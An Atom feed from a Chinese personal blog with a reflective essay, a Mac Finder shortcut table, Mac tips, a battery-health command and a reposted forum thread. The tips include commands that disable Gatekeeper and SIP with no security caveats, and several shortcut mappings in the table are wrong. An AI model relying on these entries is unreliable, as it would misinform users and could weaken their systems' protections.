<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Damao</title>
  
  <subtitle>乐躬耕于陇亩兮，吾爱吾庐。聊寄傲于琴书兮，以待天时。</subtitle>
  <link href="http://damao2250.com/atom.xml" rel="self"/>
  
  <link href="http://damao2250.com/"/>
  <updated>2025-06-06T16:06:13.363Z</updated>
  <id>http://damao2250.com/</id>
  
  <author>
    <name>Damao</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>我在炒锅里看见自己</title>
    <link href="http://damao2250.com/2025/06/07/%E6%88%91%E5%9C%A8%E7%82%92%E9%94%85%E9%87%8C%E7%9C%8B%E8%A7%81%E8%87%AA%E5%B7%B1/"/>
    <id>http://damao2250.com/2025/06/07/%E6%88%91%E5%9C%A8%E7%82%92%E9%94%85%E9%87%8C%E7%9C%8B%E8%A7%81%E8%87%AA%E5%B7%B1/</id>
    <published>2025-06-06T16:05:12.000Z</published>
    <updated>2025-06-06T16:06:13.363Z</updated>
    
    <content type="html"><![CDATA[<p>没错，又到了那个不需要任何仪式，却又让人有些期待的日子。没别的深刻含义，只是像个节点一样在提醒自己，又一年过去了。而今年它赋予了自己一个特殊的立己标签。</p><p>其实本来也没打算写些文字来记录这个时刻的，只是前些天机缘巧合下和一位认识了多年却从未谋面的朋友（其实应该是导师）见上面了。早在八年前我就一直与他的作品有交集，也通过微博有过一次简短的交流。从那后不知道为什么我总能从他的作品里感受到强大的力量，甚至像是某种神秘的引力。也正是那一年在工作上发生了质变，如今看来这些年的认知水准看似在提升，可在那一年已然是历史顶峰，再也没有破壳而出的那种感觉。</p><p>“广州是个巨大的批发部”<br>“啊 村长在广州，好想面基”<br>“广州有啥好吃的，吃走”</p><p>就这样，缘分的齿轮终于交织到一起了。简单吃了一顿饭，聊现状、规划、自救，聊世界运行框架，聊知识、产权、关系的层层递进，还有很多想法。整个过程下来，输出了有很多刷新我认知观念，比如视角从所处空间跃升到更高维度、对现行规则的重构设想、脱离区域生产的可能性，以及他想构建“世界”的坚定信念。他说了一句让我印象很深刻的话，大概意思是“明明自己有能力去影响「在炒锅里有能力却又未发芽」的人，但自己却没有做，是一件很悲哀的事”。聊的这些不确定在未来能否改变些什么，但至少能听得进去了，或许在未来的某个时间把这些想法体现的淋漓尽致。</p><p>其实这段时间也正是处于一个低谷期，想要做出改变却又一次次被人性给打倒。他的出现像是一场命运特意安排的相遇，与他聊完我更加坚定了我的信念了。也明白任何事物的初期都是非常痛苦的，就跟几年前刚入门那样，熬过去就好了。毕竟所有值得追求的东西，一开始都会伪装成困难。往后自己再回首这段时光的时候，也必然觉得没什么大不了的。世间万事万物发展都遵循着一个规律：前期慢慢积累装备升级打怪，后期才会变得强大。但这是一个浮躁横行的时代，人们渐渐失去了思考的能力，更加需要沉着冷静，一步一个脚印地往前走。环境如此，那就必须“自救”，否则只会淹没在时代的浪潮里。</p><p>八年前寻找方向，如今在这个道路上应该追寻自我，开启第二波主升浪，即使到最后没有任何波澜，这段旅程本身，也值得了。</p><p><img src="https://raw.githubusercontent.com/Damao2250/FileTransfer/master/sky-5725621_1280.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;没错，又到了那个不需要任何仪式，却又让人有些期待的日子。没别的深刻含义，只是像个节点一样在提醒自己，又一年过去了。而今年它赋予了自己一个特殊的立己标签。&lt;/p&gt;
&lt;p&gt;其实本来也没打算写些文字来记录这个时刻的，只是前些天机缘巧合下和一位认识了多年却从未谋面的朋友（其实应该是</summary>
      
    
    
    
    <category term="碎碎念" scheme="http://damao2250.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
    <category term="碎碎念" scheme="http://damao2250.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>Mac Finder快捷键记录</title>
    <link href="http://damao2250.com/2025/05/21/Finder%E5%BF%AB%E6%8D%B7%E9%94%AE%E8%AE%B0%E5%BD%95/"/>
    <id>http://damao2250.com/2025/05/21/Finder%E5%BF%AB%E6%8D%B7%E9%94%AE%E8%AE%B0%E5%BD%95/</id>
    <published>2025-05-21T06:35:56.000Z</published>
    <updated>2025-05-21T06:42:09.047Z</updated>
    
    <content type="html"><![CDATA[<h2 id="📁-基础导航"><a href="#📁-基础导航" class="headerlink" title="📁 基础导航"></a>📁 基础导航</h2><table><thead><tr><th>快捷键</th><th>功能说明</th></tr></thead><tbody><tr><td><code>Command + N</code></td><td>新建一个 Finder 窗口</td></tr><tr><td><code>Command + T</code></td><td>新建一个标签页</td></tr><tr><td><code>Command + W</code></td><td>关闭当前窗口或标签页</td></tr><tr><td><code>Command + M</code></td><td>最小化当前窗口</td></tr><tr><td><code>Command + H</code></td><td>隐藏 Finder</td></tr><tr><td><code>Command + Tab</code></td><td>在不同应用程序之间切换</td></tr><tr><td><code>Command + \</code></td><td>切换到当前窗口的不同标签页</td></tr><tr><td><code>Command + [数字]</code></td><td>跳转到第 N 个标签页</td></tr></tbody></table><hr><h2 id="🔍-文件与文件夹操作"><a href="#🔍-文件与文件夹操作" class="headerlink" title="🔍 文件与文件夹操作"></a>🔍 文件与文件夹操作</h2><table><thead><tr><th>快捷键</th><th>功能说明</th></tr></thead><tbody><tr><td><code>Command + C</code></td><td>复制选中项</td></tr><tr><td><code>Command + X</code></td><td>剪切选中项</td></tr><tr><td><code>Command + V</code></td><td>粘贴</td></tr><tr><td><code>Command + Option + V</code></td><td>移动粘贴（移动而非复制）</td></tr><tr><td><code>Command + A</code></td><td>全选</td></tr><tr><td><code>Command + D</code></td><td>复制所选项并重命名副本</td></tr><tr><td><code>Command + I</code></td><td>显示简介（属性）</td></tr><tr><td><code>Command + Delete</code></td><td>将选中项移到废纸篓</td></tr><tr><td><code>Command + Shift + Delete</code></td><td>清倒废纸篓</td></tr><tr><td><code>Delete</code></td><td>删除（若已选中文件）</td></tr><tr><td><code>Enter</code> 或 <code>Return</code></td><td>重命名选中文件/文件夹</td></tr><tr><td><code>Space</code></td><td>快速预览选中文件（使用“快速查看”）</td></tr><tr><td><code>Command + O</code> 或 双击</td><td>打开选中项</td></tr><tr><td><code>Command + P</code></td><td>打印选中文件（如果支持）</td></tr><tr><td><code>Command + Option + C</code></td><td>复制当前选中文件路径</td></tr></tbody></table><hr><h2 id="🧭-浏览与视图切换"><a href="#🧭-浏览与视图切换" class="headerlink" title="🧭 浏览与视图切换"></a>🧭 浏览与视图切换</h2><table><thead><tr><th>快捷键</th><th>功能说明</th></tr></thead><tbody><tr><td><code>Command + ↑</code></td><td>返回上一级目录</td></tr><tr><td><code>Command + ↓</code></td><td>打开选中文件夹（等同于双击）</td></tr><tr><td><code>Command + ←</code> / <code>→</code></td><td>在历史记录中前后切换</td></tr><tr><td><code>Command + F</code></td><td>进入搜索模式</td></tr><tr><td><code>Command + J</code></td><td>显示当前视图选项</td></tr><tr><td><code>Command + 1</code></td><td>切换为图标视图</td></tr><tr><td><code>Command + 2</code></td><td>切换为列表视图</td></tr><tr><td><code>Command + 3</code></td><td>切换为栏目视图</td></tr><tr><td><code>Command + 4</code></td><td>切换为画廊视图（macOS Mojave 及以上）</td></tr><tr><td><code>Command + Shift + H</code></td><td>打开当前用户的主目录</td></tr><tr><td><code>Command + Shift + G</code></td><td>输入路径前往文件夹（Go to Folder）</td></tr><tr><td><code>Command + Shift + C</code></td><td>打开颜色面板（仅限支持颜色标签的系统版本）</td></tr></tbody></table><hr><h2 id="📂-文件夹定位与书签"><a href="#📂-文件夹定位与书签" class="headerlink" title="📂 文件夹定位与书签"></a>📂 文件夹定位与书签</h2><table><thead><tr><th>快捷键</th><th>功能说明</th></tr></thead><tbody><tr><td><code>Command + Shift + N</code></td><td>新建文件夹</td></tr><tr><td><code>Command + B</code></td><td>添加当前文件夹到边栏（书签）</td></tr><tr><td><code>Command + L</code></td><td>创建所选项目的快捷方式（别名）</td></tr><tr><td><code>Command + U</code></td><td>打开用户文件夹</td></tr><tr><td><code>Command + Shift + D</code></td><td>打开桌面文件夹</td></tr><tr><td><code>Command + Option + L</code></td><td>自动将下载项目归类（仅限“下载”文件夹）</td></tr></tbody></table><hr><h2 id="🕹️-边栏与工具栏"><a href="#🕹️-边栏与工具栏" class="headerlink" title="🕹️ 边栏与工具栏"></a>🕹️ 边栏与工具栏</h2><table><thead><tr><th>快捷键</th><th>功能说明</th></tr></thead><tbody><tr><td><code>Command + Option + S</code></td><td>显示/隐藏边栏</td></tr><tr><td><code>Command + /</code></td><td>显示帮助窗口</td></tr><tr><td><code>Command + Shift + ?</code></td><td>打开快捷键查看器（快捷键搜索）</td></tr></tbody></table><hr><h2 id="💡-其他技巧"><a href="#💡-其他技巧" class="headerlink" title="💡 其他技巧"></a>💡 其他技巧</h2><ul><li>按住 <code>Option</code> 键时，“前往”菜单会显示更多隐藏文件夹。</li><li>使用 <code>Command + Shift + .</code> 可以显示/隐藏 Finder 中的隐藏文件。</li><li>使用 <code>Command + Shift + U</code> 可快速打开“公用”文件夹。</li><li>使用 <code>Command + Shift + K</code> 可进入“网络”界面。</li></ul><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;📁-基础导航&quot;&gt;&lt;a href=&quot;#📁-基础导航&quot; class=&quot;headerlink&quot; title=&quot;📁 基础导航&quot;&gt;&lt;/a&gt;📁 基础导航&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;快捷键&lt;/th&gt;
&lt;th&gt;功能说明&lt;/th&gt;
&lt;/tr&gt;</summary>
      
    
    
    
    <category term="MAC" scheme="http://damao2250.com/categories/MAC/"/>
    
    
    <category term="Finder" scheme="http://damao2250.com/tags/Finder/"/>
    
  </entry>
  
  <entry>
    <title>Mac使用笔记</title>
    <link href="http://damao2250.com/2025/05/14/Mac%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <id>http://damao2250.com/2025/05/14/Mac%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</id>
    <published>2025-05-14T04:03:50.000Z</published>
    <updated>2025-05-22T09:36:18.322Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、启动台行列设置"><a href="#1、启动台行列设置" class="headerlink" title="1、启动台行列设置"></a>1、启动台行列设置</h3><p>在【终端】中输入或粘贴以下命令，修改后面的数字以更改行列数（默认为：5 行 7 列）</p><h5 id="设置行数"><a href="#设置行数" class="headerlink" title="设置行数"></a>设置行数</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults <span class="token function">write</span> com.apple.dock springboard-rows -int <span class="token number">7</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="设置列数"><a href="#设置列数" class="headerlink" title="设置列数"></a>设置列数</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults <span class="token function">write</span> com.apple.dock springboard-columns -int <span class="token number">9</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="应用更改"><a href="#应用更改" class="headerlink" title="应用更改"></a>应用更改</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">killall</span> Dock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="2、程序坞显示时间"><a href="#2、程序坞显示时间" class="headerlink" title="2、程序坞显示时间"></a>2、程序坞显示时间</h3><p>隐藏/显示程序坞，鼠标放在屏幕底部，默认显示程序坞非常慢</p><p>在【终端】中修改<code>autohide-delay</code>数值改为<code>0</code>，隐藏/显示程序坞会变快，但是也容易发生误触（默认为 0.5s）</p><h5 id="设置-0-延迟"><a href="#设置-0-延迟" class="headerlink" title="设置 0 延迟"></a>设置 0 延迟</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults <span class="token function">write</span> com.apple.dock autohide-delay -float <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="应用更改-1"><a href="#应用更改-1" class="headerlink" title="应用更改"></a>应用更改</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">killall</span> Dock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="恢复默认"><a href="#恢复默认" class="headerlink" title="恢复默认"></a>恢复默认</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults delete com.apple.dock autohide-delay <span class="token operator">&amp;&amp;</span> <span class="token function">killall</span> Dock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="3、允许安装任何来源软件"><a href="#3、允许安装任何来源软件" class="headerlink" title="3、允许安装任何来源软件"></a>3、允许安装任何来源软件</h3><p>【终端】输入或粘贴以下命令，按回车键，输入密码按回车键。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> spctl --master-disable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="4、SIP-状态"><a href="#4、SIP-状态" class="headerlink" title="4、SIP 状态"></a>4、SIP 状态</h3><p>【终端】输入 <code>csrutil status</code>，按回车键</p><h5 id="关闭-SIP"><a href="#关闭-SIP" class="headerlink" title="关闭 SIP"></a>关闭 SIP</h5><p>Mac 开机立即按住 <code>Command-R</code></p><p>进入实用工具窗口，点击实用工具里【终端】，输入下面命令按回车键，重启 Mac</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">csrutil disable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="开启-SIP"><a href="#开启-SIP" class="headerlink" title="开启 SIP"></a>开启 SIP</h5><p>同上，在【终端】中输入下面命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">csrutil <span class="token builtin class-name">enable</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="5、提示“已损坏，无法打开，移到废纸篓”"><a href="#5、提示“已损坏，无法打开，移到废纸篓”" class="headerlink" title="5、提示“已损坏，无法打开，移到废纸篓”"></a>5、提示“已损坏，无法打开，移到废纸篓”</h3><ul><li>设置-隐私与安全性-允许以下来源的应用程序-任何来源</li><li>打开终端，输入 <code>xattr -cr </code>（cr 后面有一个空格），将 App 拖到终端（也可以手动输入 app 的完整名称，有空格需要在空格前加反斜杠），按回车键</li><li>如果还是打不开，先前往设置 - 隐私与安全性 - 完整磁盘访问权限中允许终端。然后才能操作，否则会遇到 Operation not permitted</li><li>如果还是不行，到【应用程序】尝试右键软件选择【打开】</li></ul><hr><h3 id="6、退出所有程序-快捷指令"><a href="#6、退出所有程序-快捷指令" class="headerlink" title="6、退出所有程序(快捷指令)"></a>6、退出所有程序(快捷指令)</h3><p><a href="https://www.icloud.com/shortcuts/9075b6e71a4e4045a372c5557349fb8c">https://www.icloud.com/shortcuts/9075b6e71a4e4045a372c5557349fb8c</a></p><hr><h3 id="7、测试网速"><a href="#7、测试网速" class="headerlink" title="7、测试网速"></a>7、测试网速</h3><p>在【终端】中输入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">networkQuality<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>官网介绍：<a href="https://support.apple.com/zh-cn/101942">https://support.apple.com/zh-cn/101942</a></p><hr><h3 id="8、Chrome-浏览器开启-HDR"><a href="#8、Chrome-浏览器开启-HDR" class="headerlink" title="8、Chrome 浏览器开启 HDR"></a>8、Chrome 浏览器开启 HDR</h3><p>打开浏览器输入 chrome://flags/#force-color-profile 选择 HDR10</p><hr><h3 id="9、Finder-相关设置"><a href="#9、Finder-相关设置" class="headerlink" title="9、Finder 相关设置"></a>9、Finder 相关设置</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 显示隐藏文件</span>defaults <span class="token function">write</span> com.apple.finder AppleShowAllFiles -bool <span class="token boolean">true</span><span class="token function">killall</span> Finder<span class="token comment"># 取消显示隐藏文件</span>defaults <span class="token function">write</span> com.apple.finder AppleShowAllFiles -bool <span class="token boolean">false</span><span class="token function">killall</span> Finder<span class="token comment"># 显示文件扩展名</span>defaults <span class="token function">write</span> NSGlobalDomain AppleShowAllExtensions -bool <span class="token boolean">true</span><span class="token function">killall</span> Finder<span class="token comment"># 取消显示文件扩展名</span>defaults <span class="token function">write</span> NSGlobalDomain AppleShowAllExtensions -bool <span class="token boolean">false</span><span class="token function">killall</span> Finder<span class="token comment"># 显示路径栏</span>defaults <span class="token function">write</span> com.apple.finder ShowPathbar -bool <span class="token boolean">true</span><span class="token function">killall</span> Finder<span class="token comment"># 显示状态栏</span>defaults <span class="token function">write</span> com.apple.finder ShowStatusBar -bool <span class="token boolean">true</span><span class="token function">killall</span> Finder<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="10、设置状态栏图标间距或内边距"><a href="#10、设置状态栏图标间距或内边距" class="headerlink" title="10、设置状态栏图标间距或内边距"></a>10、设置状态栏图标间距或内边距</h3><p>设置间距 5 内边距 4 比较紧凑适合显示多图标的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 指定间距</span>defaults -currentHost <span class="token function">write</span> -globalDomain NSStatusItemSpacing -int <span class="token number">5</span><span class="token comment"># 指定内边距</span>defaults -currentHost <span class="token function">write</span> -globalDomain NSStatusItemSelectionPadding -int <span class="token number">4</span><span class="token comment"># 当前间距查询</span>defaults -currentHost <span class="token builtin class-name">read</span> -globalDomain NSStatusItemSpacingdefaults -currentHost <span class="token builtin class-name">read</span> -globalDomain NSStatusItemSelectionPadding<span class="token comment"># 重置</span>defaults -currentHost delete -globalDomain NSStatusItemSpacingdefaults -currentHost delete -globalDomain NSStatusItemSelectionPadding<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有设置过，查询会如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults -currentHost <span class="token builtin class-name">read</span> -globalDomain NSStatusItemSpacing<span class="token number">2025</span>-05-14 <span class="token number">14</span>:52:05.050 defaults<span class="token punctuation">[</span><span class="token number">14080</span>:295257<span class="token punctuation">]</span>The domain/default pair of <span class="token punctuation">(</span>kCFPreferencesAnyApplication, NSStatusItemSpacing<span class="token punctuation">)</span> does not existdefaults -currentHost <span class="token builtin class-name">read</span> -globalDomain NSStatusItemSelectionPadding<span class="token number">2025</span>-05-14 <span class="token number">14</span>:52:26.061 defaults<span class="token punctuation">[</span><span class="token number">14110</span>:295697<span class="token punctuation">]</span>The domain/default pair of <span class="token punctuation">(</span>kCFPreferencesAnyApplication, NSStatusItemSelectionPadding<span class="token punctuation">)</span> does not exist<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调整图标顺序：按住command再用鼠标拖动图标</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1、启动台行列设置&quot;&gt;&lt;a href=&quot;#1、启动台行列设置&quot; class=&quot;headerlink&quot; title=&quot;1、启动台行列设置&quot;&gt;&lt;/a&gt;1、启动台行列设置&lt;/h3&gt;&lt;p&gt;在【终端】中输入或粘贴以下命令，修改后面的数字以更改行列数（默认为：5 行 7 列）</summary>
      
    
    
    
    <category term="MAC" scheme="http://damao2250.com/categories/MAC/"/>
    
    
    <category term="Mac技巧" scheme="http://damao2250.com/tags/Mac%E6%8A%80%E5%B7%A7/"/>
    
    <category term="Mac设置" scheme="http://damao2250.com/tags/Mac%E8%AE%BE%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>Mac查看电池健康度命令</title>
    <link href="http://damao2250.com/2025/05/13/Mac%E6%9F%A5%E7%9C%8B%E7%94%B5%E6%B1%A0%E5%81%A5%E5%BA%B7%E5%BA%A6%E5%91%BD%E4%BB%A4/"/>
    <id>http://damao2250.com/2025/05/13/Mac%E6%9F%A5%E7%9C%8B%E7%94%B5%E6%B1%A0%E5%81%A5%E5%BA%B7%E5%BA%A6%E5%91%BD%E4%BB%A4/</id>
    <published>2025-05-13T08:56:46.000Z</published>
    <updated>2025-05-13T09:04:17.453Z</updated>
    
    <content type="html"><![CDATA[<ul><li>macOS 通过自带的 <a href="https://www.manpagez.com/man/8/ioreg/">ioreg</a> 查询电池健康信息</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ioreg -rn AppleSmartBattery <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'/AppleRawMaxCapacity/&#123;raw=$NF&#125; /DesignCapacity/&#123;design=$NF&#125; /CycleCount/&#123;cycle=$NF&#125; END&#123;printf "当前最大容量: %d mAh | 设计容量: %d mAh | 循环次数 %d 次 | 健康度: %.1f%%\n", raw, design, cycle, (raw/design)*100&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>输出: 当前最大容量: 6012 mAh | 设计容量: 6075 mAh | 循环次数 6 次 | 健康度: 99.0%</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;macOS 通过自带的 &lt;a href=&quot;https://www.manpagez.com/man/8/ioreg/&quot;&gt;ioreg&lt;/a&gt; 查询电池健康信息&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;line-numbers language-bash&quot; d</summary>
      
    
    
    
    <category term="MAC" scheme="http://damao2250.com/categories/MAC/"/>
    
    
    <category term="电池健康" scheme="http://damao2250.com/tags/%E7%94%B5%E6%B1%A0%E5%81%A5%E5%BA%B7/"/>
    
  </entry>
  
  <entry>
    <title>越来越快，越来越少</title>
    <link href="http://damao2250.com/2025/05/09/%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB%EF%BC%8C%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%B0%91/"/>
    <id>http://damao2250.com/2025/05/09/%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB%EF%BC%8C%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%B0%91/</id>
    <published>2025-05-09T03:03:04.000Z</published>
    <updated>2025-05-09T04:08:40.235Z</updated>
    
    <content type="html"><![CDATA[<h3 id="越来越快，越来越少"><a href="#越来越快，越来越少" class="headerlink" title="越来越快，越来越少"></a>越来越快，越来越少</h3><p><strong>在信息过载的今天</strong><br><strong>你还记得上一次认真、反复地看一篇文章或电影是什么时候吗</strong><br><strong>看完是否还记得作者所要表达的主题</strong><br><strong>快节奏似乎早已让我们失去细细咀嚼内容的时间</strong><br><strong>现在人们可以在短时间内获取海量的碎片化信息</strong><br><strong>却仍害怕自己汲取的信息量不够大、不够快</strong><br><strong>于是无时无刻不在沿着多巴胺带来的短暂兴奋的方向持续不断地摄入信息</strong><br><strong>殊不知摄入的大部分都是信息垃圾</strong><br><strong>以至于越来越没有耐心，用三分钟看完一本书或一部电影</strong><br><strong>以至于渐渐远离了深度思考，也远离了彼此</strong><br><strong>以至于不再渴望与老朋友见面，即便见了面，寒暄之后也只是低头玩手机</strong><br><strong>“从前车马很慢，书信很远，一生只够爱一个人”</strong><br><strong>真正的喜欢是愿意花时间的</strong><br><strong>不至于跳过开头，跳过结尾，跳过细节，跳过感受</strong><br><strong>也不至于把“认真”这件事，都变成了一种奢侈</strong><br><strong>有时候我会想，慢一点，其实没关系</strong><br><strong>慢一点也许你会发现</strong><br><strong>世界并不全是热闹和喧嚣</strong><br><strong>还有沉默中的温柔和心动的瞬间</strong></p><blockquote><p>观 v2ex《不好意思见老同学的心理》有感</p></blockquote><h3 id="转载：《不好意思见老同学的心理》"><a href="#转载：《不好意思见老同学的心理》" class="headerlink" title="转载：《不好意思见老同学的心理》"></a>转载：《不好意思见老同学的心理》</h3><blockquote><p>节点：沉默的螺旋</p><p>2018-05-28 16:23:38</p></blockquote><h4 id="主帖"><a href="#主帖" class="headerlink" title="主帖"></a>主帖</h4><p>前几天，看电视节目《白钟元的胡同餐馆》，有位开汉堡店的老阿姨，不愿意出演节目、上电视。原因她说，自己并不想开餐馆，只是做生意失败，被迫无奈，才开这家小店营生，所以不愿意上节目，让以前的熟人，知道自己沦落到如此处境。</p><p>这几天，我在把家里的纸质旧照片，扫描成电子版，有不少我出生前的 70 年代旧照片，就边扫边和我娘聊天。我娘也提到，有老同学来叫她，参加同学聚会，她不愿意去，原因也是，当年她在班里叱咤风云，也算是一号人物。现在去参加聚会，估计老同学都会想，怎么现在混成这样了——虽然我并不觉得，娘有啥不体面之处。我爹在旁边也抗议，说咋了？嫌嫁给我咋了？</p><p>我就联想到自己。刚刚几年没联系、高中时关系很好的同学，发微信给我。他知道我已经辞了深圳工作、彻底回老家后，说改天约出来见见，好久没见了。我说好改天约，但其实心里，并不愿意甚至怕见面。倒不是薄情寡义，只是不好意思、挂不住颜面。中学时考试，常年班里第一，高考六百多分考到北京。但之后的人生轨迹，就是断崖式下滑，细节不说了，总之很不如意。</p><p>发这帖，是想看看，有怕见老同学这种心态的朋友多吗？有没有过来人，你是怎么迈过这种心理的？</p><p><strong>PS：</strong> 涉及家人，请攻击型人格留口德，若您渴望怼人风凉话、见人跌倒补一脚，或回帖不为交流，只为满足 cocky ego，右上角关闭，去其它帖发泄，感谢</p><hr><h4 id="回复内容"><a href="#回复内容" class="headerlink" title="回复内容"></a>回复内容</h4><ol><li><p><strong>BlackDai</strong></p><blockquote><p>同感，沙发</p></blockquote></li><li><p><strong>boa2005</strong></p><blockquote><p>同学又不等于朋友，志同道合的永远不多，没什么好见的</p></blockquote></li><li><p><strong>luoway</strong></p><blockquote><p>我没有这种不好意思见老同学的心理。</p><p>但是不想约见老同学，仅仅因为人生轨迹不同，已经没有交集，没有共同话题了。</p><p>虽然不甘如此，但这种不甘远没到想要去改变它的程度。</p><p>所以，就这样吧。</p></blockquote></li><li><p><strong>cs923</strong></p><blockquote><p>分人，关系好的还是挺希望聚一聚耍一耍的。</p></blockquote></li><li><p><strong>kunluanbudang</strong></p><blockquote><p>同感</p><p>我现在有点讨厌一线大城市了，<br>在这里奉献自己的青春，却一点『归属感 / 安全感』也没有，<br>只有『孤独 + 加班加班 / 被压榨 / 各种洗脑』</p><p>（当然，没人非要我呆这里，我只不过是一粒尘埃）</p></blockquote></li><li><p><strong>Ovels</strong></p><blockquote><p>正常心理吧，我也是这样，所以去了离家挺远的城市，只有过年才回去一下</p></blockquote></li><li><p><strong>Mrun</strong></p><blockquote><p>一线容不下灵魂，家乡容不下肉体。身在一线已经回不去了啊</p></blockquote></li><li><p><strong>netherlanddennis</strong></p><blockquote><p>自己调整下心理。</p></blockquote></li><li><p><strong>chotow</strong></p><blockquote><p>每次毕业，离开一个环境，都不会再联系，不管当初多好；小学到大学一直都这样。<br>大家都有了自己的生活，没什么可以交流。<br>无意见了面，点个头，继续自己的生活。</p></blockquote></li><li><p><strong>LeungV2</strong></p><blockquote><p>觉得自己混的不好 有时候这样想 才不想见。</p><p>不过大多数还是见的 心里没什么芥蒂（估计我是比较念旧跟重感情吧 哈哈）</p><p>在一起吃个饭 聊一聊当初 现在 未来 觉得也很惬意啊</p></blockquote></li><li><p><strong>MrCurly</strong></p><blockquote><p>看个人心态吧，我和以前同学联系也不多，只是单纯的认为生活轨迹和圈子已经不同了，没什么好聊的</p></blockquote></li><li><p><strong>watch</strong></p><blockquote><p>如果是经常联系的那种同学或者朋友 就不会放不下面子</p></blockquote></li><li><p><strong>wangzimeng</strong></p><blockquote><p>可能是楼主还没缓过来？？</p><p>理想与现实，过去与现在，的差距？？？</p><p>其实没什么的。</p><p>怨我直言：地球是圆的，没有人会永远处在波峰，也没有人会永远处在波谷，所谓，“三十年河东，三十年河西”。</p></blockquote></li><li><p><strong>Damon4V</strong></p><blockquote><p>平常心就可以了，看远一点。</p></blockquote></li><li><p><strong>ys0290</strong></p><blockquote><p>平常心，当你认识到人的发展是本身素质和家庭背景社会背景和机遇的综合结果时，应该会释然吧</p></blockquote></li><li><p><strong>yoke123</strong></p><blockquote><p>看开点 该怎么过就怎么过</p></blockquote></li><li><p><strong>wqqdhero</strong></p><blockquote><p>自己先看开点吧 总的来说 都是生命中的过客而已</p><p>我还会担心 老同学里面混的好的 会不自觉地炫耀 添堵</p></blockquote></li><li><p><strong>co3site</strong></p><blockquote><p>看开点，该聚聚的还是聚聚吧。想和你聚聚的关系都还不错，不存在什么挂不住颜面，人生路漫漫，将来路上说不定还有相互帮助帮助</p></blockquote></li><li><p><strong>we000</strong></p><blockquote><p>人到中年，没有肚子还有头发就值得骄傲，你不如锻炼锻炼健康生活，到时候岂不是艳压群芳？？</p></blockquote></li><li><p><strong>IsyAndroid</strong></p><blockquote><p>同学不是朋友，朋友不是兄弟！</p></blockquote></li><li><p><strong>pkookp8</strong></p><blockquote><p>来做一道阅读理解题</p><p>a 对 b 说，你家隔壁的 c 家挺有钱的，房子都买了<br>你是 b，你的理解是<br>1.a 意思是我家穷，gtmda<br>2.c 家真的很有钱 